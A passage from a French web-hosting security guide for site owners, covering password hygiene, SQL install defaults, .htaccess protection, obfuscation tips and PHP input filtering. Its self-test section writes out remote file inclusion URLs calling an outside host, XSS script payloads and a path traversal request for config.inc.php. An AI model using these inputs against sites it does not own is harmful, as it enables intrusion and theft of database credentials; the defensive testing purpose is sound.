  <span style="color: #19177C">$document_racine</span> <span style="color: #666666">=</span> <span style="color: #008000">rtrim</span>(<span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;#([</span><span style="color: #BB6622; font-weight: bold">\\\\</span><span style="color: #BA2121">/]+)#&quot;</span>, <span style="color: #BA2121">&#39;/&#39;</span>, <span style="color: #19177C">$_SERVER</span>[<span style="color: #BA2121">&#39;DOCUMENT_ROOT&#39;</span>]), <span style="color: #BA2121">&#39;/&#39;</span>);
  <span style="color: #19177C">$fich</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;#([</span><span style="color: #BB6622; font-weight: bold">\\\\</span><span style="color: #BA2121">/]+)#&quot;</span>, <span style="color: #BA2121">&#39;/&#39;</span>, <span style="color: #008000">realpath</span>(<span style="color: #19177C">$fich</span>));
  <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;#^(</span><span style="color: #BB6688; font-weight: bold">$document_racine</span><span style="color: #BA2121">)#&quot;</span>, <span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$fich</span>);
}
<span style="color: #BC7A00">?&gt;</span>
</pre></div>

						<a id="motpasse"></a><hr><br>
						<header>
							<h2>Les mots de passe</h2>
						</header>
						<p>Protégez vos mots de passe.<br>
						On peut essayer de pénétrer votre hébergement en devinant votre mot de passe FTP ou SQL. Si vous changez les mots de passe, respectez les règles suivantes&nbsp;:<br>
						<strong>1-</strong> un mot de passe doit avoir au minimum 12 caractères, plus c'est mieux.<br>
						<strong>2-</strong> il ne doit jamais être un mot qu'on trouve dans le dictionnaire d'aucune langue. Les logiciels pour cracker des mots de passe ont des dictionnaires de centaines de milliers de mots de toutes les langues et cherchent toutes les combinaisons. Cela prend entre quelques minutes à quelques petites heures pour cracker ces mots de passe très facilement.<br>
						<strong>3-</strong> Un bon mot de passe contient des lettres majuscules et minuscules, des chiffres et des caractères non alphanumériques (comme les ponctuations).<br>
						<strong>4-</strong> <strong>N'UTILISEZ JAMAIS LE MÊME MOT DE PASSE pour le FTP, base SQL, e-mail, interface d'administration du site web</strong>. Le pirate <strong>SAIT</strong> que s'il trouve votre mot de passe, il a de fortes chances que ce soit le même mot de passe ailleurs&nbsp;!!! Beaucoup d'hébergeurs proposent un mot de passe unique pour “simplifier” la gestion.</p>
						<p>Il existe des logiciels qui créent des mots de passe uniques et aléatoires et gèrent cela pour vous (regardez <a href="https://bitwarden.com">Bitwarden</a>, <a href="https://www.keepassx.org">KeepassX</a> et <a href="https://keepass.info">Keepass</a>, <a href="https://1password.com/fr/">1Password</a>, <a href="https://www.dashlane.com/fr">Dashlane</a>, <a href="https://www.lastpass.com/fr">LastPass</a>…). C'est ce qu'il y a de mieux car vous n'avez rien à mémoriser. <br>
						Vous pouvez créer cette liste vous-même dans un fichier que vous protègerez par un mot de passe et copier-coller les données pour chaque formulaire de connexion. Pour simplifier cette tâche, vous pouvez aussi choisir de faire confiance à votre navigateur web qui enregistrera vos mots de passe uniques, synchronisera vos données entre vos appareils et remplira pour vous le champ du formulaire à chaque connexion avec le bon mot de passe. Pour générer ces mots de passe uniques, voyez par exemple ces sites web&nbsp;:<br>
						<a href="https://www.motdepasse.xyz">https://www.motdepasse.xyz</a><br>
						<a href="https://fr.vpnmentor.com/tools/secure-password-generator/">https://fr.vpnmentor.com/tools/secure-password-generator/</a><br>
						<a href="https://www.comparitech.com/privacy-security-tools/password-strength-test/">https://www.comparitech.com/privacy-security-tools/password-strength-test/</a></p> 
						<p> Ces sites web proposent des mots de passe phonétiques, créant des mots faciles à mémoriser&nbsp;:<br>
						<a href="https://www.dashlane.com/fr/features/password-generator">https://www.dashlane.com/fr/features/password-generator</a> (Dashlane)<br>
						<a href="https://www.lastpass.com/fr/password-generator">https://www.lastpass.com/fr/password-generator</a> (LastPass)<br>
						<a href="https://tools.arantius.com/password">https://tools.arantius.com/password</a></p>
						<p>Pour être sûr qu'un mot de passe mémorisable ou phonétique n'existe dans aucune langue, tapez-le en partie ou en entier dans un moteur de recherche. S'il ne retourne aucun résultat, alors votre mot de passe n'est pas un mot du dictionnaire.</p>
						<a id="installsql"></a><hr><br>
						<header>
							<h2>Installation d'une base SQL</h2>
						</header>
						<p>Lorsque vous installez votre CMS, blog ou e-commerce pour la première fois, il vous propose des réglages et paramètres par défaut que nous acceptons à chaque fois. En cas de faille, le pirate peut utiliser ces réglages et paramètres par défaut pour pénétrer votre base SQL et la modifier.</p>
						<p>Voici quelques conseils pour éviter que cette forme d'attaque de type injection SQL soit possible. Il y a plusieurs formes d'injections SQL. La règle 3 du .htaccess en arrête une autre forme. Sinon, la vraie protection contre les injections SQL est une bonne programmation.</p>
						<p><strong>1-</strong> Quand vous installez votre CMS, blog ou e-commerce, il vous donne comme login “admin” et vous demande d'entrer un mot de passe. Dans la mesure du possible, changez “admin” pour autre chose, un pseudo par exemple. Un pirate sait que le login par défaut est “admin” et lancera ses scripts uniquement sur le mot de passe. Mais si le login “admin” n'existe pas, il n'a aucune chance de pénétrer le système.<br>
						Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.</p>
						<p><strong>2-</strong> Le premier utilisateur est donc l'administrateur et il porte toujours le numéro (ou ID) 1. Dans le cas où le login n'est pas “admin”, certains scripts peuvent essayer d'avoir le mot de passe de l'utilisateur numéro 1 qui est, dans 99,99% des cas, l'administrateur. Dans la mesure du possible, effacez l'utilisateur numéro 1 sur la liste et soyez l'administrateur portant le numéro 2 ou 15 ou 250.<br>
						Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.</p>
						<p><strong>3-</strong> Lors de l'installation, votre CMS, blog ou e-commerce vous demande de choisir un préfixe pour le nom des tables. On accepte toujours le préfixe par défaut comme wp_ pour Wordpress, g2_ pour Gallery2, dc_ pour DotClear, phpbb_ pour phpBB, etc. Le pirate peut chercher la table avec la liste des utilisateurs et leurs mots de passe. Si, comme tout le monde, vous n'avez pas changé le préfixe, il lui sera facile de trouver la table. Donc, changez le préfixe de vos tables SQL pour plus de sécurité. Vous pouvez le faire après installation. Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.<br>
						Par exemple, avec Wordpress en cas de changement de préfixe après installation, il faut aussi changer 2 entrées dans la base de données en plus du fichier wp-config.php, voyez leurs forums pour savoir comment faire.</p>
						<p><strong>Mon conseil: <span style="color:#008080;">TOUJOURS MODIFIER LES PARAMÈTRES PAR DÉFAUT&nbsp;!</span></strong></p>
						<a id="nommage"></a><hr><br>
						<header>
							<h2>Nommage de fichiers</h2>
						</header>
						<p>Pour éviter que les robots des pirates ne vous trouvent grâce à Google, changez certaines habitudes et notamment le nom et l'URL de certains fichiers.</p>
						<p>1- N'appelez pas la page de votre formulaire de contact&nbsp;: mail.php ou contact.html. Appelez là autrement comme “courrier”, “missive”, etc. Les robots spammeurs auront plus de mal à trouver un formulaire de contact à pirater pour envoyer des spams grâce à une faille de votre script d'envoi de mail.<br>
						Faites la même chose avec d'autres fichiers&nbsp;: pas de login.php, admin.php, download.php (on va chercher la faille pour télécharger un fichier hors de son répertoire), etc. En règle général, évitez ces mots anglais trop répandus.</p>
						<p>2- Les spammeurs ne sont pas idiots. Changez aussi certains noms du formulaire. Dans les balises html INPUT, changez l'attribut NAME qui contient des mots comme “e-mail”, “mail”, “name” ou “subject” par leur équivalent en français (courriel, nom, sujet). Faites ce changement dans le formulaire HTML et dans votre script php ou cgi.</p>
						<p>3- Évitez de donner le nom de votre CMS, blog ou e-commerce directement dans l'URL comme&nbsp;: www.domaine.tld/admin/ ou www.domaine.tld/login/ ou www.domaine.tld/blog/ ou www.domaine.tld/forum/ ou www.domaine.tld/shop/. Les spammeurs et piratent cherchent ces URL à cibler pour une attaque. Soyez plus original pour votre sécurité. Le mieux est d'éviter le mot anglais et de préférer son équivalent en français.</p>
						<a id="cryptconfig"></a><hr><br>
						<header>
							<h2>Crypter son fichier config.inc.php</h2>
						</header>
						<p>Malgré toutes les précautions, le pirate a pénétré votre site et cherche maintenant à connaitre les login et mot de passe de votre base MySQL pour la pirater, la vider et en prendre le contrôle. On peut lui compliquer la tâche en cryptant ces données sensibles. Le serveur web pourra lire ces informations facilement, mais elles ne seront pas lisibles directement par un &#339;il humain. <br>
						Pour un expert en PHP, cette protection ne dure que 2 minutes, cela lui fait du travail en plus, mais nous ne sommes pas là pour lui faciliter la tâche&nbsp;?</p>
						<p>Visitez ce site web et cryptez vos données. <br>
<a href="http://www.phpencode.org">www.phpencode.org</a> ou <a href="http://www.mobilefish.com/services/php_obfuscator/php_obfuscator.php">www.mobilefish.com/services/php_obfuscator/php_obfuscator.php</a> ou cherchez un “PHP Obfuscator”.</p>
						<p>Par exemple, mon fichier config.php contient ceci&nbsp;:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
<span style="color: #408080; font-style: italic">/* MySQL settings */</span>
<span style="color: #19177C">$db_server</span>   <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;serveursql&quot;</span>;
<span style="color: #19177C">$db_name</span>     <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;nombasesql&quot;</span>;
<span style="color: #19177C">$db_username</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;loginsql&quot;</span>;
<span style="color: #19177C">$db_password</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;motdepasse&quot;</span>;
<span style="color: #BC7A00">?&gt;</span>
</pre></div>
						<p>Je copie la partie à encoder entre les balises &lt;?php et&nbsp;?&gt;<br>
						Je choisis l'encodage “PHP Extrastrength”. Ne cherchez pas un encodage plus élevé, j'ai parfois constaté des erreurs sur les serveurs web.<br>
						Je copie la longue ligne qui commence par eval(xxxx entre les balises &lt;? et&nbsp;?&gt; et le colle dans le fichier config.inc.php, ce qui donne&nbsp;:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
<span style="color: #008000; font-weight: bold">eval</span>(<span style="color: #008000">gzuncompress</span>(<span style="color: #008000">gzinflate</span>(<span style="color: #008000">base64_decode</span>(<span style="color: #BA2121">&#39;AW4Akf942k3LTQqAIBQE4H3QHQZp5cYDRDeoRXSAMHyIkFo+K7p9f5t2w3wzSkmJ7hz6Fkw5u2AZUipVFpWZRqa0UwLQQLx5S7zOov40aE/ApyH6STP9dLsP7+LWOVoXfrZo5iMm85iP2dBTkKgv8oMsVg==&#39;</span>)))); 
<span style="color: #BC7A00">?&gt;</span>
</pre></div>
						<p>Ainsi, vous pouvez occulter toutes les informations sensibles.</p>
						<p>Et attribuez par FTP les droits 404 ou 444 à votre fichier config.inc.php (ou équivalent) si c'est possible.</p>
						<a id="cryptmail"></a><hr><br>
						<header>
							<h2>Cryptez votre adresse e-mail</h2>
						</header>
						<p>Si vous n'avez pas d'autre choix que d'afficher une adresse e-mail sur votre site web, vous avez 2 solutions:</p>
						<p><strong>1-</strong> Créez un fichier image (svg, png, jpeg) avec votre adresse écrite dessus. Ce n'est pas du texte, les robots spammeurs ne le verront pas.</p>
						<p><strong>2-</strong> Cryptez votre adresse e-mail avec du javascript. J'utilise cette méthode depuis des années et jamais ces adresses n'ont été spammées. Allez sur ce site web <a href="http://www.jottings.com/obfuscator/">www.jottings.com/obfuscator/</a> ou <a href="https://jumk.de/nospam/stopspam.html">jumk.de/nospam/</a> pour faire crypter votre adresse.<br>
						Pour aller encore plus loin, au lieu d'intégrer ce code à votre page html, on va l'appeler depuis un fichier javascript. L'avantage est que si l'adresse est présente sur plusieurs pages, vous n'avez à faire la modification qu'une fois.<br>
						Créez un dossier qu'on appelle “js” et on va y mettre un fichier qu'on va appeler “adresse.js”. Copiez dans ce fichier la ligne de code javascript de votre adresse e-mail cryptée qui commence par “var …”. Par exemple:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">var g6=&quot;&quot;;for(var z1=0;z1&lt;335;z1++)g6+=String.fromCharCode((&quot;{fw%}&lt;B\'m3xnmya\'Bwj {tjxztrst%a\'a\'B kjwm%fA,0.a\'a\'1l4 4-jhfqujw3,?tyqnfr,aaBkjw ,ViqyVj755zaajsVnfrtistr5955zaantr,ztjxztrst%Sa\',aa,0.a\'a\'1l4V4-jhfqujw3str@5955}(+ntrCa\',aa,aaBkjwm3xnmya\'By4-jhfqujw3,Cf4AiqyS@j7}(+jsnfrSti.b5`ba\'a\'`1l4S\'@z5B\'\'@ktw-{fw%u&lt;B5@u&lt;A}&lt;3qjslym@u&lt;0B88.z50B}&lt;3xzgxyw-u&lt;188.3xuqny-\'\'.3wj{jwxj-.3otns-\'\'.@j{fq-z5.&quot;.charCodeAt(z1)-(-59+64)+24+39)%(5*2+85)+-45+77);document.write(eval(g6))</pre>
<p>Ensuite, dans votre page html, copiez le code suivant&nbsp;:</p>
<span class="smallfont">Code HTML:</span>
<pre class="smallfont code"><span style="color:#800000">&lt;script src=<span style="color:#0000FF">&quot;js/adresse.js&quot;</span> type=<span style="color:#0000FF">&quot;text/javascript&quot;</span>&gt;</span><span style="color:#800000">&lt;/script&gt;</span></pre>
						<a id="adressmail"></a><hr><br>
						<header>
							<h2>Adresses e-mails à éviter</h2>
						</header>
						<p>Plus en rapport avec le spam qu'avec le piratage, les adresses e-mails qui ont les préfixes les plus courants sont spammées automatiquement (car ils ont plus de chances d'exister). Donc, évitez de créer des adresses avec les noms suivants&nbsp;:<br>
						webmaster@ admin@ contact@ email@ mail@ info@ sales@ support@ root@ www@ abuse@ news@</p>
						<p>J'utilisais contact@ et info@ sans jamais les diffuser sur le web, mais le nombre de spams devenaient insupportables. Bref, pour le spam comme pour le piratage, il faut éviter la fainéantise intellectuelle et les paramètres par défaut.</p>
						<a id="dossierpasse"></a><hr><br>
						<header>
							<h2>Protéger un dossier avec un mot de passe</h2>
						</header>
						<p>La protection par mot de passe Apache en utilisant un fichier “.htaccess” et un fichier “.htpasswd” est très efficace. Il existe plusieurs guides expliquant comment faire (par exemple <a href="http://www.infowebmaster.fr/tutorial-crypter-htpasswd.php">ici</a> ou <a href="http://www.sthda.com/french/wiki/proteger-un-dossier-par-htaccess">là</a>). Cryptez votre mot de passe avec la méthode “bcrypt”. Les méthodes classiques “crypt” et “sha-1” ne sont plus surs. Vous pouvez encoder votre mot de passe en “bcrypt” en ligne <a href="https://www.bcrypt.fr/">ici</a> ou <a href="http://aspirine.org/htpasswd.html">là</a> ou <a href="https://github.com/fpirsch/twin-bcrypt">hors ligne</a>.</p>
						<p>Pour cela, créez tout d'abord un fichier “.htaccess” dans le répertoire que vous voulez protéger, et copiez le code ci-dessous. Notez bien que le chemin d'accès au fichier “.htpasswd”, celui qui contient l'identifiant et le mot de passe, peut être placé n'importe où dans l'hébergement. Vous n'avez pas à le mettre dans le même répertoire que “.htaccess”</p>
<span class="smallfont">Code htaccess&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### CHEMIN D'ACCÈS ABSOLU AU FICHIER “.htpasswd” </span>
<span style="color: #408080; font-style: italic">### QUI PEUT ÊTRE LOCALISÉ DANS UN RÉPERTOIRE DIFFÉRENT.</span>
<span style="color: #008000">AuthUserFile</span> <span style="color: #008000">/home/www/secret/.htpasswd</span>
<span style="color: #008000">AuthGroupFile</span> <span style="color: #008000">/dev/null</span>
<span style="color: #008000">AuthName</span> <span style="color: #BA2121">&quot;Accès Protégé&quot;</span>
<span style="color: #008000">AuthType</span> Basic
<span style="color: #008000">require</span> valid-user
</pre></div>
						<p>Puis, enregistrez le fichier “.htpasswd” (dans le répertoire mentionné dans le “.htaccess” ci-dessus). L'exemple ci-dessous présente un accès autorisé pour l'identifiant&nbsp;: <em>Mon_Id34_Compliqué</em> et le mot de passe&nbsp;: <em>E@|oVfL73:r%U@tY7vT2</em> crypté en BCrypt&nbsp;:</p>
<span class="smallfont">Code htpasswd&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### IDENTIFIANT ET MOT DE PASSE CRYPTÉ EN BCRYPT </span>
<span style="color: #008000">Mon_Id34_Compliqué<span style="color: #000000">:</span>$2y$11$1jgFlzFxF1hHMx0fLT2l/OG5o8zxjz46r6sRwnItzBs.ZZFGLR0e6</span>
</pre></div>
						<p>Or, les didacticiels oublient tous un point important&nbsp;: ne nommez pas le fichier contenant le mot de passe “.htpasswd”. Ce nom n'est pas obligatoire, on utilise ce nom par convention, pas par obligation. Vous pouvez l'appeler comme vous voulez, par exemple “.htmotdepasse” ou “.machinbidule”. Ce nom personnalisé est déclaré dans le fichier “.htaccess”. Ainsi, le pirate ne trouvera pas de fichier “.htpasswd” car il est nommé autrement&nbsp;!</p>
						<p>Bloquez tout accès accidentel en lecture au fichier “.htmotdepasse” en créant une règle htaccess dans le répertoire dans lequel il se trouve&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008000; font-weight: bold">&lt;Files</span> <span style="color: #BA2121">.htmotdepasse</span><span style="color: #008000; font-weight: bold">&gt;</span>
<span style="color: #008000">order</span> allow,deny
<span style="color: #008000">deny</span> from <span style="color: #008000; font-weight: bold">all</span>
<span style="color: #008000; font-weight: bold">&lt;/Files&gt;</span>
</pre></div>
						<p><strong>Bloquer encore mieux le répertoire “administration”&nbsp;:</strong><br>
						Enfin, le tableau de bord ou l'interface d'administration de votre blog, CMS ou e-commerce dispose déjà d'une protection par identifiant et mot de passe. Seulement, cette défense est dépendante de la technique employée par le programmeur et elle peut souffrir d'une faille de sécurité. <strong>Ajouter, en plus, un deuxième système de mot de passe avec le fichier “.htaccess” renforce considérablement la protection pour accéder au tableau de bord ou l'interface d'administration.</strong> Cette double authentification n'est pas gênante puisque les logiciels navigateurs web enregistrent ces mots de passe. Ne vous en privez pas. Bien sûr, vous utiliserez des mots de passe différents et complexes pour les deux méthodes&nbsp;! Seule l'agression par force brute peut venir à bout du mot de passe “.htaccess”, alors, autant le rendre long et compliqué. Et normalement, votre hébergeur s'apercevra de ce comportement suspect et bloquera l'attaquant à temps.</p>
						<a id="robots"></a><hr><br>
						<header>
							<h2>Le fichier robots.txt</h2>
						</header>
						<p>Vous connaissez le rôle du fichier robots.txt&nbsp;? <a href="http://www.robotstxt.org/">http://www.robotstxt.org</a> On utilise ce fichier pour interdire à un moteur de recherche d'indexer un dossier ou un fichier.</p>
						<p>Mais ne déclarez pas dans ce fichier robots.txt un répertoire ou un fichier qui doit rester secret non seulement des moteurs de recherche mais aussi des pirates&nbsp;!!! Tout le monde peut lire le contenu du fichier robots.txt et donc trouver l'adresse de votre dossier/fichier secret.</p>
						<p>Pour garder un dossier à l'abri des regards des robots indexeurs et des pirates, il est plus efficace de le protéger avec un mot de passe htaccess (voir ci-dessus).</p>
						<a id="protcss"></a><hr><br>
						<header>
							<h2>Protéger vos fichiers style.css et index.php</h2>
						</header>
						<p>Protégez par FTP vos fichiers “style.css” et “index.php” avec les droits 404 ou 444. J'ai vu un cas de piratage du fichier style.css où le pirate avait modifié ce fichier pour afficher un pop-up.<br>
						Protégez aussi par FTP le fichier “index.php” avec les droits 404 ou 444, car c'est par lui que passent toutes les commandes de votre CMS, blog ou e-commerce.</p>
						<a id="testweb"></a><hr><br>
						<header>
							<h2>Comment tester la sécurité de mon site web&nbsp;?</h2>
						</header>
						<p>Voici 3 méthodes simples qui vous permettront de vérifier si vous utilisez un script avec de grosses failles de sécurité. Avec un filtrage des données entrantes et les conseils donnés dans cet article, vous devriez être capable de régler le problème. Sinon, pour votre sécurité, changez de CMS, blog ou e-commerce car le développeur ne s'est pas préoccupé de la sécurité.</p>
						<p>D'après mes logs, les 3 attaques suivantes représentent la grosse majorité. Ces failles sont si énormes que les pirates les cherchent en premier. Ils sont comme nous, adeptes du moindre effort.</p>
						<p><strong class="vert">REMARQUE 1&nbsp;:</strong> <strong>aucun de ces exemples ne vous apprendra à pirater un site.</strong> Il en faut bien plus et c'est plus compliqué que ça. Cependant, vous saurez si votre script est mal codé ou non.</p>
						<p><strong class="vert">REMARQUE 2&nbsp;:</strong> Désactivez les règles de filtrages du fichier .htaccess proposées <a href="#htaccess">ci-dessus.</a> En effet, ces règles vont stopper la plupart des attaques présentées ci-dessous en vous envoyant une erreur <em>“403 Forbidden”</em>. Donc, pour savoir si votre script est faillible, désactivez ces règles et s'il y a une faille, corrigez le script ou installez-en un autre mieux sécurisé.</p>
						<p><strong>1- Attaque par exécution d'un script externe&nbsp;:</strong><br>
						Créez un fichier texte contenant le code suivant:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;Hackeur vaillant, rien d&#39;impossible !!!&quot;</span>;
<span style="color: #BC7A00">?&gt;</span>
</pre></div>
						<p>Appelez-le “pirate.txt” et faites-en une autre copie appelée “pirate.php”. Puis, par FTP, mettez-les dans le dossier www de votre serveur.</p>
						<p>Dans votre CMS, blog ou e-commerce, les URLs ressemblent à ça (à adapter à votre cas)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=123</pre></p>Remplacez “123” par “http://www.votredomaine.tld/pirate.txt” comme ceci:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=http://www.votredomaine.tld/pirate.txt?</pre>
						<p>Si vous voyez le message <em>“Hackeur vaillant, rien d'impossible&nbsp;!!!”</em> apparaitre, alors vous avez un énorme trou de sécurité. Oui, un fichier texte, au lieu d'être lu, a été exécuté en php. On peut faire la même chose avec son fichier php:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=http://www.votredomaine.tld/pirate.php?</pre>
						<p>On peut aller plus loin. Si le fichier pirate est sur un autre site&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=http://www.autresiteweb.tld/pirate.txt?</pre>
						<p><strong>2- Attaque par XSS ou Cross Site Scripting&nbsp;:</strong><br>
						On utilise le javascript pour prendre le contrôle de votre CMS, blog ou e-commerce.<br>
						Vos URLs ressemblent à ça (à adapter à votre cas)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=123</pre>
						<p>On remplace “123” par du javascript. S'il n'est pas filtré, alors c'est piraté. Par exemple&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=&quot;&gt;&lt;script&gt;alert(/Hackeur vaillant, rien d'impossible&nbsp;!!!/)&lt;/script&gt;</pre>
						<p>Ou une autre variante&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=javascript:alert(%22Hackeur vaillant, rien d'impossible&nbsp;!!!%22)</pre>
						<p>Si une fenêtre d'alerte javascript apparait avec le texte <em>“Hackeur vaillant, rien d'impossible&nbsp;!!!”</em>, votre site est ouvert à ce genre d'attaque.</p>
						<p><strong>3- Faille dans le téléchargement et le téléversement de fichiers&nbsp;:</strong><br>
						Cela s'applique à 2 cas&nbsp;:</p>
						<p>a) Vous avez un script de téléchargement qui propose à vos visiteurs de prendre des fichiers. Vous avez mis tous les fichiers à télécharger dans un dossier de votre hébergement, par exemple /home/loginftp/www/download/ .<br>
						Votre URL ressemble à ça (à adapter à votre cas)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/download.php?fichier=monfichier.pdf</pre>
						<p>Si on modifie “monfichier.pdf” qui se trouve dans le dossier “/home/loginftp/www/download/” par “../config.inc.php” qui se trouve ici “/home/loginftp/www/” comme cela&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/download.php?fichier=../config.inc.php</pre>
						<p>Est-ce qu'on le télécharge&nbsp;? A-t-on ainsi les login et mot de passe de votre base de données SQL&nbsp;? Croyez-le ou pas, mon script de téléchargement le permettait. Donc, on pouvait prendre n'importe quel fichier de mon site.</p>
						<p>Le même genre de comportement se retrouve dans le téléversement (upload), qui permet au pirate d'enregistrer son fichier de prise de control dans n'importe quel endroit de votre hébergement.</p>
						<p>b) Vous avez un script PHP qui utilise la fonction include() pour appeler d'autres fichiers. Ces fichiers sont appelés depuis l'URL et non dans le code PHP du script. Par exemple&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=forum.php</pre>
						<p>Comme ci-dessus, peut-on charger d'autres fichiers&nbsp;? Par exemple le fichier robots.txt&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=robots.txt</pre>
						<p>Normalement, on ne peut pas voir le contenu d'un fichier PHP car son code est exécuté à la différence du script de téléchargement en a). Donc, ceci devrait donner une page blanche, mais vérifiez-le quand même&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=config.inc.php</pre>
						<p>Heureusement, chez certains hébergeurs la fonction PHP include() ne permet pas d'ouvrir un fichier en dehors de votre hébergement (pour des raisons de sécurité). Mais cela doit être possible sur d'autres serveurs moins sécurisés&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">http://www.votredomaine.tld/?page=http://www.autresite.tld</pre>
						<p><em>À cœur vaillant, rien d'impossible</em> est la devise de Jacques Coeur qui vécut au XVe s.<br>
						<em>Comme je regrette le temps des pages statiques en html&nbsp;!</em> est ma devise. &#x1f609;</p>
						<a id="filtrephp"></a><hr><br>
						<header>
							<h2>Sécuriser un script PHP</h2>
						</header>
						<p>Une explication sur la sécurité avec PHP est ici&nbsp;: <a href="http://phpsec.org/projects/guide/">http://phpsec.org/projects/guide/</a></p>
						<p>Ensuite, si vous utilisez un petit script en PHP qui traite les données d'un formulaire ou d'une variable dans une URL comme “/?page=23&amp;id=machin” (donc utilisation des requêtes GET ou POST), il faut filtrer ces données pour éviter toute faille.</p>
						<p>J'utilise ce bout de code que je mets en tête du script afin de filtrer toutes les données qui y entrent&nbsp;:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$_REQUEST</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$key</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$val</span>) 
{
  <span style="color: #19177C">$val</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^_A-Za-z0-9-\.&amp;=]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$val</span>);
  <span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$key</span>] <span style="color: #666666">=</span> <span style="color: #19177C">$val</span>;
}
</pre></div>
						<p>Ainsi ne sont autorisés que les caractères alphanumériques et les signes _ . &amp; =<br>
						Tous les autres caractères sont effacés.</p>
						<p>Il existe un autre filtre si celui présenté ci-dessus est trop restrictif&nbsp;:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$_REQUEST</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$key</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$val</span>) 
{
  <span style="color: #19177C">$val</span> <span style="color: #666666">=</span> trim(<span style="color: #008000">stripslashes</span>(<span style="color: #008000">htmlentities</span>(<span style="color: #19177C">$val</span>)));
  <span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$key</span>] <span style="color: #666666">=</span> <span style="color: #19177C">$val</span>;
}  
</pre></div>
						<p>Pour protéger une variable précise envoyée par formulaire on peut mettre au choix un des deux filtres ci-dessous (ne pas mettre les 2 filtres pour une même variable)&nbsp;:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">/* pour un filtrage de base */</span>
